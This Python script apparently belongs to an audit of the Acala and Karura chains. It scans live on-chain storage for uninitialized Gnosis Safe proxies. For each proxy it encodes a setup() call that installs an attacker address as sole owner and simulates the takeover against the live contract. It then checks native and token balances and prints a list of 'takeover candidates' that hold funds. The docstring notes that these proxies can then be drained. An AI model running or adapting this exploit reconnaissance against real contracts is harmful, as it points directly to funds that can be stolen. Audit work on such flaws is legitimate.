#!/usr/bin/env python3
"""FALLBACK / highest-value lead: Gnosis Safe V1.3.0 proxies are deployed on
both chains (ref_count 12 Acala / 7 Karura for the 171-byte GnosisSafeProxy
runtime). A GnosisSafeProxy whose setup() was never called has threshold==0 and
can be taken over by ANY caller via setup([attacker],1,...), then drained with
execTransaction. This script enumerates those proxy addresses from LIVE
EVM.Accounts storage, reads getOwners()/getThreshold(), simulates setup() with
eth_call, and measures native + predeploy-token balances.
"""
import json, sys, os, datetime, traceback
import urllib.request

CHAINS = {
    'acala': ('https://acala-rpc.aca-api.network', 'https://eth-rpc-acala.aca-api.network', 10),
    'karura': ('https://karura-rpc.aca-api.network', 'https://eth-rpc-karura.aca-api.network', 8),
}
# code_hash (EVM.Codes storage key) of GnosisSafeProxy V1.3.0 (171 B runtime)
SAFE_PROXY_HASH = '0xb89c1b3bdf2cf8827818646bce9a8f6e372885f8c55e5c07acbd307cb133b000'
SAFE_SINGLETON_HASH = '0x21842597390c4c6e3c1239e434a682b054bd9548eee5e9b1d6a4482731023c0f'
ZERO_ADDR = '0x' + '0' * 40
ATTACKER = '0x000000000000000000000000000000000000dEaD'   # eth_call only, no state change
SELECTORS = {'getOwners': '0xa0e67e2b', 'getThreshold': '0xe75235b8',
             'getModules': '0x08cb9c7d', 'VERSION': '0x9a8a0592',
             'getFallbackHandler': '0x2f9a3e8f', 'getGuard': '0x0e8236ee'}

def rpc(url, method, params, timeout=15):
    req = urllib.request.Request(url, data=json.dumps({
        'jsonrpc': '2.0', 'id': 1, 'method': method, 'params': params}).encode(),
        headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.load(r)

def j(x):
    if hasattr(x, 'value') and not isinstance(x, (dict, list, str, int, float, bytes)):
        try: return j(x.value)
        except Exception: return str(x)[:200]
    if isinstance(x, bytes): return '0x' + x.hex()
    if isinstance(x, dict): return {str(k): j(v) for k, v in x.items()}
    if isinstance(x, (list, tuple)): return [j(v) for v in x]
    if isinstance(x, (str, int, float, bool)) or x is None: return x
    return str(x)[:200]

def word(v): return v.lower().replace('0x', '').rjust(64, '0')

def encode_setup(owners, threshold):
    """GnosisSafe.setup(address[],uint256,address,bytes,address,address,uint256,address)
    selector 0xb63e800d; head starts at 0x100 (8 words); owners array at 0x100."""
    sel = 'b63e800d'
    head_off = 8 * 32
    parts = [word(hex(head_off)), word(hex(threshold)), word(ZERO_ADDR),
             word(hex(head_off + 2 * 32 + len(owners) * 32)),  # data offset (empty bytes)
             word(ZERO_ADDR), word(ZERO_ADDR), word('0'), word(ZERO_ADDR)]
    arr = [word(hex(len(owners)))] + [word(o) for o in owners] + [word('0')]  # empty bytes length
    return '0x' + sel + ''.join(parts) + ''.join(arr)

def main(chain, out):
    from substrateinterface import SubstrateInterface
    rpc_url, evm_url, ss58 = CHAINS[chain]
    sub = SubstrateInterface(url=rpc_url, ss58_format=ss58)
    fin = rpc(rpc_url, 'chain_getFinalizedHead', []).get('result')
    hdr = rpc(rpc_url, 'chain_getHeader', [fin]).get('result')
    sub.init_runtime(block_hash=fin)
    res = {'chain': chain, 'generated_at_utc': datetime.datetime.now(datetime.timezone.utc).isoformat(),
           'finalized_hash': fin, 'block_number': int(hdr['number'], 16),
           'rpc': rpc_url, 'evm_rpc': evm_url,
           'safe_proxy_code_hash': SAFE_PROXY_HASH, 'errors': [], 'proxies': []}

    # token predeploys to check balances on (from checked-out predeploy_map.json)
    try:
        pm = json.load(open('scripts/audit/predeploy_map.json'))
        tokens = [(r[0], r[1]) for r in pm[:14] if isinstance(r[1], str)]
    except Exception:
        tokens = []
    # add the highest-supply ERC20 addresses registered on the chain
    try:
        st = json.load(open(f'audit-live/{chain}-state.json'))['storage']
        m = st.get('AssetRegistry.Erc20IdToAddress', {}).get('rows', [])
        for _id, addr in m[:8]: tokens.append(('Erc20', addr))
    except Exception: pass

    try:
        rows = sub.query_map('EVM', 'Accounts', block_hash=fin, max_results=4000, page_size=100)
        n = 0
        for k, v in rows:
            n += 1
            addr = j(k)
            if not isinstance(addr, str) or not addr.startswith('0x'): continue
            info = j(v)
            ci = info.get('contract_info') if isinstance(info, dict) else None
            ch = ci.get('code_hash') if isinstance(ci, dict) else None
            if isinstance(ch, str) and ch.lower() == SAFE_PROXY_HASH:
                res['proxies'].append({'address': addr})
        res['evm_accounts_scanned'] = n
    except Exception as e:
        res['errors'].append({'where': 'EVM.Accounts', 'error': str(e),
                              'trace': traceback.format_exc()[-1200:]})
    print('safe proxies found', len(res['proxies']), 'of', res.get('evm_accounts_scanned'), flush=True)

    for p in res['proxies']:
        a = p['address']
        for name, sel in SELECTORS.items():
            try:
                r = rpc(evm_url, 'eth_call', [{'to': a, 'data': sel}, 'latest'])
                p[name] = r.get('result') if 'error' not in r else 'ERR:' + str(r['error'])[:120]
            except Exception as e: p[name] = 'ERR:' + str(e)
        try:
            thr = p.get('getThreshold')
            p['threshold'] = int(thr, 16) if isinstance(thr, str) and thr.startswith('0x') and len(thr) >= 66 else None
        except Exception: p['threshold'] = None
        # simulate the permissionless takeover (eth_call = no state change)
        try:
            data = encode_setup([ATTACKER], 1)
            r = rpc(evm_url, 'eth_call', [{'from': ATTACKER, 'to': a, 'data': data}, 'latest'])
            p['setup_eth_call'] = r.get('result') if 'error' not in r else 'ERR:' + str(r['error'])[:200]
        except Exception as e: p['setup_eth_call'] = 'ERR:' + str(e)
        try:
            r = rpc(evm_url, 'eth_getBalance', [a, 'latest'])
            p['native_balance_wei'] = int(r['result'], 16) if isinstance(r.get('result'), str) else 0
        except Exception: p['native_balance_wei'] = 0
        p['token_balances'] = {}
        for sym, tok in tokens:
            d = '0x70a08231' + word(a)
            try:
                r = rpc(evm_url, 'eth_call', [{'to': tok, 'data': d}, 'latest'])
                v = r.get('result')
                bal = int(v, 16) if isinstance(v, str) and v.startswith('0x') else 0
                if bal: p['token_balances'][sym + ':' + tok] = bal
            except Exception: pass
        p['has_value'] = bool(p['native_balance_wei']) or bool(p['token_balances'])
        p['uninitialized'] = p.get('threshold') == 0
        p['takeover_candidate'] = bool(p['uninitialized'] and p['has_value'] and
                                       not str(p.get('setup_eth_call', '')).startswith('ERR'))
    res['takeover_candidates'] = [p['address'] for p in res['proxies'] if p.get('takeover_candidate')]
    res['uninitialized_count'] = sum(1 for p in res['proxies'] if p.get('uninitialized'))
    res['with_value_count'] = sum(1 for p in res['proxies'] if p.get('has_value'))
    os.makedirs(os.path.dirname(out) or '.', exist_ok=True)
    with open(out, 'w') as f: json.dump(res, f, indent=1, default=str)
    print('wrote', out, 'uninitialized', res['uninitialized_count'],
          'with_value', res['with_value_count'],
          'TAKEOVER_CANDIDATES', res['takeover_candidates'], flush=True)
    for p in res['proxies'][:12]:
        print(' ', p['address'], 'thr', p.get('threshold'), 'wei', p['native_balance_wei'],
              'tokens', p['token_balances'], 'setup', str(p.get('setup_eth_call'))[:60], flush=True)

if __name__ == '__main__':
    main(sys.argv[1] if len(sys.argv) > 1 else 'acala',
         sys.argv[2] if len(sys.argv) > 2 else 'audit-live/gnosis-safes-acala.json')
